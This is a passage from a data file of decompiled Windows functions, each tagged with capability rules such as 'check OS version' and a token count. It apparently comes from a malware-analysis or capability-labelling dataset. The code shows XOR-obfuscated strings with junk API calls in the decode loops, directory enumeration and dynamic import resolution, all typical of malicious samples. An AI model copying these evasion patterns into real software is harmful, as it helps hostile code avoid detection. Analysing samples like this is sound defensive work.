puVar12 = lpFileName + -2;\n                do {\n                    piVar4 = puVar12 + 2;\n                    puVar12 = puVar12 + 2;\n                } while (*piVar4 != 0);\n                for (uVar11 = uVar13 >> 2; uVar11 != 0; uVar11 = uVar11 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                for (uVar13 = uVar13 & 3; uVar13 != 0; uVar13 = uVar13 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n                if (hFindFile != -1) {\n                    var_58h = 0x4a627762;\n                    var_78h = 0x4a62774c;\n                    var_74h._0_2_ = 0x4968;\n                    var_80h = 0x6b4f734b;\n                    var_7ch._0_2_ = 0x3464;\n                    var_88h = 0x6b617365;\n                    var_84h._0_2_ = 0x3464;\n                    var_5ch = 6;\n                    do {\n                        uVar3 = (*pcVar14)(8, 9);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar7 = 0;\n                        lpString2 = iVar10;\n                        var_3ch = &var_58h - iVar10;\n                        do {\n                            iVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            if (iVar8 != 0xa6ebc2) {\n                                *(iVar7 + iVar10) = *(&var_78h + iVar7 % var_5ch) ^ (iVar7 + iVar10)[&var_58h - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 4);\n                        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar7 = 0;\n                        var_44h = iVar10;\n                        var_3ch = &var_80h - iVar10;\n                        do {\n                            iVar9 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n                            iVar8 = lpString2;\n                            if (iVar9 != 0x9a7e6c) {\n                                *(iVar7 + iVar10) = *(&var_88h + iVar7 % var_5ch) ^ (iVar7 + iVar10)[&var_80h - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 6);\n                        iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, lpString2);\n                        pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (((iVar7 != 0) &&\n                            (iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar10),  iVar7 != 0)) &&\n                           ((lpFindFileData & 0x10) != 0)) {\n                            var_30h = 0x6c37597f;\n                            var_2ch = 0x5952521a;\n                            var_28h = 0x52596c34;\n                            var_24h = 0x6c3d5960;\n                            var_20h = 0x5947520d;\n                            var_1ch = 0x52176c31;\n                            var_18h = 0x6c2b5954;\n                            var_14h = 0x59675225;\n                            var_10h = 0x52146c3d;\n                            var_ch._0_1_ = 0x43;\n                            var_ch._1_2_ = 0x5859;\n                            var_ch._3_1_ = 0x6c;\n                            var_90h = 0x6c585933;\n                            var_8ch._0_2_ = 0x5279;\n                            uVar3 = (*pcVar14)(8, 0x51);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_3ch = iVar10;\n                            var_8h = &var_30h - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.USER32.dll_GetCapture)();\n                                if (iVar8 != 0xf75fb5) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_90h + iVar7 % var_5ch) ^ (iVar7 + iVar10)[&var_30h - iVar10];\n                                }\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x28);\n                            var_c0h = 0x4831501b;\n                            var_bch = 0x501e343c;\n                            var_b8h = 0x34384820;\n                            var_b4h = 0x481d503b;\n                            var_b0h = 0x50353400;\n                            var_ach = 0x342d4822;\n                            var_a8h = 0x481d5036;\n                            var_a4h = 0x503f3418;\n                            var_a0h = 0x343c482c;\n                            var_9ch._0_2_ = 0x505a;\n                            var_98h = 0x4841505a;\n                            var_94h._0_2_ = 0x344c;\n                            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_d4h = iVar10;\n                            var_8h = &var_c0h - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n                                if (iVar8 != 0xcda5a7) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_98h + iVar7 % var_5ch) ^ (iVar7 + iVar10)[&var_c0h - iVar10];\n                                }\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x26);\n                            var_50h = var_3ch;\n                            var_8h = 0;\n                            var_70h = 0x4d66614a;\n                            var_6ch._0_1_ = 0x66;\n                            pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                            var_54h = iVar10;\n                            do {\n                                var_38h = 0x4d15616f;\n                                var_34h = 0x66444a3a;\n                                var_30h = 0x6116663e;\n                                var_2ch = 0x4a154d43;\n                                var_28h = 0x6638663d;\n                                var_24h = 0x4d0c613b;\n                                var_20h = 0x660a4a05;\n                                var_1ch = 0x612d6628;\n                                var_18h = 0x4a0e4d13;\n                                var_14h = 0x6663660d;\n                                var_10h = 0x4d0b613e;\n                                var_ch._0_1_ = 0x16;\n                                var_ch._1_2_ = 0x614a;\n                                var_ch._3_1_ = 0x66;\n                                uVar3 = (*pcVar14)(8, 0x61);\n                                iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                                iVar7 = 0;\n                                var_d0h = &var_38h - iVar10;\n                                do {\n                                    iVar8 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n                                    puVar5 = ARG_0;\n                                    if (iVar8 != 0x342de1) {\n                                        *(iVar7 + iVar10) =\n                                             *(&var_70h + iVar7 % var_c4h) ^ (iVar7 + iVar10)[&var_38h - iVar10];\n                                    }\n                                    iVar7 = iVar7 + 1;\n                                } while (iVar7 < 0x30);\n                                (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar10, var_60h, &lpString1, (&var_54h)[var_8h])\n                                ;\n                                iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(puVar5);\n                                pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                if (iVar7 != -1) {\n                                    fcn.00401000();\n                                    var_cch = 1;\n                                }\n                                uVar3 = (*pcVar14)(0, iVar10);\n                                pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                var_8h = var_8h + 1;\n                            } while (var_8h < 2);\n                            uVar3 = (*pcVar14)(0, var_d4h);\n                            (*pcVar2)(uVar3);\n                            uVar3 = (*pcVar14)(0, var_3ch);\n                            (*pcVar2)(uVar3);\n                            iVar10 = var_44h;\n                            iVar8 = lpString2;\n                        }\n                        uVar3 = (*pcVar14)(0, iVar10);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        uVar3 = (*pcVar14)(0, iVar8);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                    } while (iVar10 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                uVar3 = (*pcVar14)(0, lpMem);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                piVar4 = var_60h;\n            }\n        }\n        if (lpFileName != NULL) {\n            uVar3 = (*pcVar14)(0, lpFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (ARG_0 != NULL) {\n            uVar3 = (*pcVar14)(0, ARG_0);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n    }\n    return var_cch;\n}\n",
        "token_count": 3942
    },
    "004022cf": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004022cf(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uchar var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_10h = 0;\n    if ((*0x41dae8 | *0x41daec) != 0) {\ncode_r0x00402683:\n        var_10h = 0x41dae8;\n        goto code_r0x00402688;\n    }\n    var_34h = 0x342e153f;\n    var_30h = 0xd357a39;\n    var_2ch = CONCAT22(var_2ch._2_2_, 0x5826);\n    var_24h = 0x584a6151;\n    var_20h._0_2_ = 0x5455;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_8h = 6;\n    iVar6 = 0;\n    var_18h = &var_34h - iVar2;\n    var_ch = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar3 != 0x4733ae) {\n            *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_8h) ^ (iVar6 + iVar2)[var_18h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_3ch = 0xd103434;\n    var_38h = 0x2d010116;\n    var_34h = 0x361a0d23;\n    var_30h = 0xd252b3a;\n    var_2ch = var_2ch & 0xff000000 | 0x6e2603;\n    var_24h = 0x6857436e;\n    var_20h._0_2_ = 0x4262;\n    uVar1 = (*pcVar5)(8, 0x14);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    var_14h = &var_3ch - iVar2;\n    var_18h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetInputState)();\n        iVar3 = var_ch;\n        if (iVar4 != 0x15ca29) {\n            *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_8h) ^ (iVar6 + iVar2)[var_14h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x13);\n    *0x41dae8 = fcn.004020bd(iVar2);\n    if (*0x41dae8 == 0) {\n        uVar1 = (*pcVar5)(0, iVar2);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\ncode_r0x004023fe:\n        (*pcVar7)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar3);\n        (*pcVar7)(uVar1);\n    }\n    else {\n        var_3ch = 0x7093b2e;\n        var_38h = 0x221b3440;\n        var_34h = 0x34c072e;\n        var_30h = 0x7282420;\n        var_2ch = var_2ch & 0xff000000 | 0x741355;\n        var_24h = 0x625a4c74;\n        var_20h._0_2_ = 0x7734;\n        uVar1 = (*pcVar5)(8, 0x14);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        var_14h = &var_3ch - iVar2;\n        var_4h = iVar2;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n            iVar3 = var_ch;\n            if (iVar4 != 0x569c12) {\n                *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_8h) ^ (iVar6 + iVar2)[var_14h];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x13);\n        *0x41daf0 = fcn.004020bd(iVar2);\n        iVar2 = var_18h;\n        if (*0x41daf0 == 0) {\n            uVar1 = (*pcVar5)(0, var_4h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_3ch = 0x122a2f2a;\n            var_38h = 0x3d190c27;\n            var_34h = 0x9313c10;\n            var_30h = 0x1a133b15;\n            var_2ch = var_2ch & 0xff000000 | 0x703438;\n            var_24h = 0x73675870;\n            var_20h._0_2_ = 0x5a57;\n            uVar1 = (*pcVar5)(8, 0x14);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_1ch = &var_3ch - iVar2;\n            var_14h = iVar2;\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                iVar3 = var_ch;\n                if (iVar4 != 0x61e43) {\n                    *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_8h) ^ (iVar6 + iVar2)[var_1ch];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x13);\n            *0x41daf8 = fcn.004020bd(iVar2);\n            iVar2 = var_18h;\n            if (*0x41daf8 != 0) {\n                var_3ch = 0xc3c2e36;\n                var_38h = 0x3f290d3b;\n                var_34h = 0x161b330b;\n                var_30h = 0xf33310f;\n                var_2ch = 0x380d002d;\n                var_28h = 0x6c;\n                var_24h = 0x6269596c;\n                var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x56);\n                uVar1 = (*pcVar5)(8, 0x16);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_8h = &var_3ch - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    iVar3 = var_ch;\n                    if (iVar4 != 0x707118) {\n                        var_1ch = 5;\n                        *(iVar6 + iVar2) = *(&var_24h + iVar6 % 5) ^ (iVar6 + iVar2)[var_8h];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x15);\n                *0x41db00 = fcn.004020bd(iVar2);\n                if (*0x41db00 != 0) {\n                    uVar1 = (*pcVar5)(0, iVar2);\n                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_14h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_4h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_18h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, iVar3);\n                    (*pcVar7)(uVar1);\n                    goto code_r0x00402683;\n                }\n                uVar1 = (*pcVar5)(0, iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_14h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_4h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_18h);\n                goto code_r0x004023fe;\n            }\n            uVar1 = (*pcVar5)(0, var_14h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n        }\n        (*pcVar5)(uVar1);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar5)(uVar1);\n        uVar1 = (*pcVar7)(0, iVar3);\n        (*pcVar5)(uVar1);\n    }\ncode_r0x00402688:\n    *0x41dafc = *0x41daf8 >> 0x20;\n    *0x41db04 = *0x41db00 >> 0x20;\n    *0x41daf4 = *0x41daf0 >> 0x20;\n    *0x41daec = *0x41dae8 >> 0x20;\n    return var_10h;\n}\n",
        "token_count": 2463
    },
    "00402913": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00402913(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    ushort var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t lpLibFileName;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_30h = 0x4343760b;\n    var_2ch = 0x33186452;\n    var_28h._0_2_ = 0x3743;\n    lpLibFileName = 0x43337664;\n    var_18h._0_1_ = 0x37;\n    var_20h = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 5;\n    iVar8 = 0;\n    var_10h = &var_30h - iVar3;\n    var_8h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar4 != 0x3d057c) {\n            *(iVar8 + iVar3) = *(&lpLibFileName + iVar8 % var_4h) ^ (iVar8 + iVar3)[var_10h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_40h = 0x26371e3b;\n    var_3ch = 0x785a7f36;\n    var_10h = 6;\n    var_38h = 0x4c160616;\n    var_2ch = 0x6a725668;\n    var_28h._0_2_ = 0x4c7a;\n    uVar2 = (*pcVar6)(8, 0xd);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_14h = &var_40h - iVar3;\n    lpLibFileName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar4 != 0x8e3dfc) {\n            *(iVar8 + iVar3) = *(&var_2ch + iVar8 % var_10h) ^ (iVar8 + iVar3)[var_14h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    var_40h = 0x1b150d20;\n    var_3ch = 0x151d3608;\n    var_38h = 0x71114;\n    var_34h = 0x7727;\n    var_10h = 0x77706573;\n    var_ch._0_1_ = 100;\n    uVar2 = (*pcVar6)(8, 0xf);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_14h = &var_40h - iVar3;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        iVar4 = lpLibFileName;\n        if (iVar5 != 0x784e2d) {\n            *(iVar8 + iVar3) = *(&var_10h + iVar8 % var_4h) ^ (iVar8 + iVar3)[&var_40h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar3);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar7 = (*pcVar6)(0, var_8h, var_24h, var_20h, 0, 0);\n    if (0x20 < uVar7) {\n        uVar7 = 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_8h);\n    (*pcVar6)(uVar2);\n    return uVar7;\n}\n",
        "token_count": 1204
    },
    "00402f79": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402f79(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uchar *arg_8h_00;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    int32_t *in_EDX;\n    code *pcVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    int32_t *piVar13;\n    uint var_a8h;\n    uint var_a0h;\n    int32_t var_78h;\n    int32_t var_74h;\n    uint32_t var_70h;\n    int32_t *var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_60h = 0;\n    var_58h = 0;\n    var_50h = 0;\n    var_48h = 0x342e153f;\n    var_44h = 0xd357a39;\n    var_40h._0_2_ = 0x5826;\n    var_8h = 0x584a6151;\n    var_4h._0_2_ = 0x5455;\n    var_6ch = in_EDX;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_ch = 0x6;\n    iVar11 = 0;\n    var_10h = &var_48h - iVar4;\n    var_5ch = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar5 != 0x4733ae) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ (iVar11 + iVar4)[var_10h];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 10);\n    var_34h = 0x5661330c;\n    var_30h = 0x1562781c;\n    var_2ch = 0x37195c43;\n    var_28h = 0x56502a1f;\n    var_24h = 0x30372319;\n    var_20h = 0x1e05565f;\n    var_1ch = 0x5c552b24;\n    var_18h = 0x70603d18;\n    var_14h._0_1_ = 0x36;\n    var_8h = 0x39364456;\n    var_4h._0_2_ = 0x4e6b;\n    uVar3 = (*pcVar10)(8, 0x22);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_10h = &var_34h - iVar4;\n    var_68h = iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCapture)();\n        iVar5 = var_5ch;\n        if (iVar6 != 0x3579f) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x21);\n    if ((*0x41e1f4 & 1) == 0) {\n        *0x41e1f4 = *0x41e1f4 | 1;\n        *0x41e1f0 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_5ch);\n    }\n    if ((*0x41e1f4 & 2) == 0) {\n        *0x41e1f4 = *0x41e1f4 | 2;\n        *0x41e1ec = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41e1f0, iVar4);\n    }\n    if (*0x41e1f0 == 0) {\n        *0x41e1f0 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5);\n    }\n    if (*0x41e1ec == NULL) {\n        var_34h = 0x5661330c;\n        var_30h = 0x1562781c;\n        var_2ch = 0x37195c43;\n        var_28h = 0x56502a1f;\n        var_24h = 0x30372319;\n        var_20h = 0x1e05565f;\n        var_1ch = 0x5c552b24;\n        var_18h = 0x70603d18;\n        var_14h._0_1_ = 0x36;\n        var_8h = 0x39364456;\n        var_4h._0_2_ = 0x4e6b;\n        uVar3 = (*pcVar10)(8, 0x22);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar11 = 0;\n        var_10h = &var_34h - iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetCapture)();\n            if (iVar5 != 0x3579f) {\n                *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 0x21);\n        *0x41e1ec = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41e1f0, iVar4);\n        uVar3 = (*pcVar10)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        iVar5 = var_5ch;\n        iVar4 = var_68h;\n    }\n    fcn.0040278e();\n    if ((*0x41e1ec != NULL) && (iVar11 = (**0x41e1ec)(var_4ch, 0, &var_a8h, 0x30, &var_54h),  -1 < iVar11)) {\n        uVar3 = (*pcVar10)(8, 0x200);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (var_10h != NULL) {\n            uVar3 = (*pcVar10)(8, 0x100);\n            iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            if (((iVar11 != 0) && (var_54h = fcn.00402db5(iVar11, 0x28),  var_54h != 0)) &&\n               (var_54h = fcn.00402db5(iVar11 + 0x28, 0x40),  arg_8h_00 = var_10h,  var_54h != 0)) {\n                var_44h = *(iVar11 + 0x3c);\n                var_64h = *(iVar11 + 0x18) + 0x10;\n                var_8h = *(iVar11 + 0x1c) + (0xffffffef < *(iVar11 + 0x18));\n                var_ch = var_6ch + 2;\n                var_48h = *(iVar11 + 0x38);\n                var_50h = 4;\n                if ((var_48h != var_64h) || (*(iVar11 + 0x3c) != var_8h)) {\n                    do {\n                        var_54h = fcn.00402db5(iVar11 + 0x68, 0x98);\n                        iVar5 = var_5ch;\n                        iVar4 = var_68h;\n                        if (var_54h == 0) break;\n                        var_78h = *(iVar11 + 0x68);\n                        var_74h = *(iVar11 + 0x6c);\n                        var_50h = var_50h + 0x120;\n                        var_48h = var_78h;\n                        var_44h = var_74h;\n                        if (var_50h <= arg_8h) {\n                            uVar7 = *(iVar11 + 0xb0) >> 1;\n                            *(var_ch + 6) = var_58h;\n                            var_ch[5] = *(iVar11 + 0xd0);\n                            *(var_ch + 7) = *(iVar11 + 0xd4);\n                            var_ch[4] = *(iVar11 + 0xa8);\n                            var_ch[2] = *(iVar11 + 0x98);\n                            var_ch[3] = *(iVar11 + 0x9c);\n                            puVar12 = arg_8h_00;\n                            for (iVar4 = 0x200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar12 = 0;\n                                puVar12 = puVar12 + 1;\n                            }\n                            var_70h = uVar7;\n                            if ((uVar7 < 0x100) && (var_54h = fcn.00402db5(arg_8h_00, *(iVar11 + 0xb0)),  var_54h != 0))\n                            {\n                                uVar8 = 0;\n                                if (uVar7 != 0) {\n                                    do {\n                                        *(uVar8 + 0x20 + var_ch) = arg_8h_00[uVar8 * 2];\n                                        uVar8 = uVar8 + 1;\n                                    } while (uVar8 < uVar7);\n                                }\n                                *(uVar7 + 0x20 + var_ch) = 0;\n                                piVar9 = NULL;\n                                piVar13 = var_ch + 8;\n                                do {\n                                    cVar1 = *piVar13;\n                                    if (cVar1 == '\\\\') {\n                                        piVar9 = piVar13;\n                                    }\n                                    piVar13 = piVar13 + 1;\n                                } while (cVar1 != '\\0');\n                                *(var_ch + 0x1e) = (piVar9 - var_ch) + -0x1f;\n                            }\n                            var_ch = var_ch + 0x48;\n                            var_58h = var_58h + 1;\n                        }\n                    } while ((var_78h != var_64h) || (iVar5 = var_5ch,  iVar4 = var_68h,  var_74h != var_8h));\n                }\n                if (var_6ch != NULL) {\n                    *var_6ch = var_58h;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar11 != 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            }\n        }\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_50h;\n    }\n    if ((var_50h <= arg_8h) && (var_50h != 0)) {\n        var_60h = 1;\n    }\n    uVar3 = (*pcVar10)(0, iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar10)(0, iVar5);\n    (*pcVar2)(uVar3);\n    return var_60h;\n}\n",
        "token_count": 2925
    },
    "004036c3": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
